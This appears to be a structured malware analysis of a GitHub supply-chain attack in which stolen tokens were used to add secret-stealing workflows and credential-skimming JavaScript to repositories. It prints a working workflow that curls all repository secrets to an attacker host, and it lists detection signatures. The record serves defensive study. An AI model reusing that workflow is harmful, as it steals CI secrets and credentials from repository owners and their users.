package_info.package_name: Unknown (multiple compromised repositories, likely via malicious package)
package_info.package_manager: Unknown (likely npm, PyPI, or other common ecosystem)
package_info.package_versions: Unknown (attack is repo-based, not tied to a single package version)
package_info.why_malicious: The attack involved the insertion of malicious GitHub Actions and JavaScript code into hundreds of repositories using stolen GitHub personal access tokens. The malicious code exfiltrates repository secrets and user credentials, and modifies project files to steal end-user passwords, all while impersonating Dependabot to evade detection.

malicious_snippets.code_snippet:
name: hook
on: [push]
jobs:
  env:
    runs-on: ubuntu-latest
    steps:
      - name: Run
        env:
          MY_ENV: ${{ toJSON(secrets) }}
          MY_VARS: ${{ toJSON(vars) }}
        run: |
          echo $MY_ENV | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
          echo $MY_VARS | curl "https://send.wagateway.pro/webhook" -H "Content-Type: application/json" -d @-
malicious_snippets.code_behavior: On every push event, the workflow serializes all GitHub repository secrets and variables, then exfiltrates them via HTTPS POST requests to a remote C2 server (send.wagateway.pro), enabling credential theft.

malice_analysis.why_suspicious: Exfiltrating all repository secrets and variables to an external server is a clear sign of malicious intent.
malice_analysis.violated_expectations: Normal GitHub Actions should not send secrets or variables to untrusted external endpoints. This action is only expected in highly controlled, auditable environments.
malice_analysis.similar_legitimate_use: A legitimate workflow might send build status or deployment notifications to a trusted endpoint, but never raw secrets.
key_indicators: Use of curl to external, non-corporate domain

execution_context.trigger: runtime (browser execution of modified JS files)

malicious_snippets.code_behavior: At runtime in the browser, the code appends a new script tag to the DOM, loading an external JavaScript file from https://send.wagateway.pro/client.js?cache=ignore, which is then executed in the user's browser.

malice_analysis.why_suspicious: Appending obfuscated code to all JS files that loads a remote script from an untrusted domain is a classic web supply chain attack.
malice_analysis.violated_expectations: Legitimate code should not silently inject remote scripts into all project JS files, especially from unknown domains.
malice_analysis.similar_legitimate_use: Dynamic script loading is used in analytics or A/B testing, but from trusted, vetted sources.
key_indicators: Obfuscated code appended to all JS files
Loads external script from suspicious domain

malicious_snippets.code_behavior: At runtime in the browser, the code detects password input fields, intercepts form submissions, serializes the form data (including credentials), and exfiltrates it to the attacker's server before allowing the form to submit normally.

malice_analysis.why_suspicious: Intercepting password form submissions and exfiltrating credentials is a textbook credential-stealing technique.
malice_analysis.violated_expectations: Legitimate scripts should not intercept and exfiltrate user credentials from password forms.
malice_analysis.similar_legitimate_use: Form validation or analytics may intercept submissions, but never exfiltrate credentials.

attack_chain.action: Victim installs a malicious package or otherwise leaks their GitHub personal access token.
attack_chain.leads_to: Attacker gains access to victim's GitHub account.

attack_chain.action: Attacker uses stolen token to push malicious commits to victim's repositories, impersonating Dependabot.
attack_chain.leads_to: Malicious code is inserted into repositories.

attack_chain.action: Malicious GitHub Action workflow is added to exfiltrate repository secrets on every push.
attack_chain.leads_to: Repository secrets are sent to attacker's server.

attack_chain.action: All JavaScript files in the repository are modified to append obfuscated loader code.
attack_chain.leads_to: End-user browsers load additional malicious script.

attack_chain.action: Malicious client.js script intercepts password form submissions and exfiltrates credentials.
attack_chain.leads_to: End-user credentials are sent to attacker's server (final goal).

behavioral_signatures: New or modified GitHub Actions workflows that POST secrets/variables to external domains
Obfuscated code appended to all *.js files that loads remote scripts
JavaScript code that intercepts password form submissions and sends data to unknown endpoints
file_indicators: Any new or modified workflow file with suspicious curl or POST commands
JS files with appended obfuscated code referencing external domains
detection_knowledge.how_to_detect: Monitor for new or modified GitHub Actions workflows that exfiltrate secrets or variables to non-corporate domains. Scan repository JS files for appended obfuscated code that loads external scripts. Use network monitoring to detect connections to known malicious domains such as send.wagateway.pro. Alert on any code that intercepts password form submissions and sends data externally.
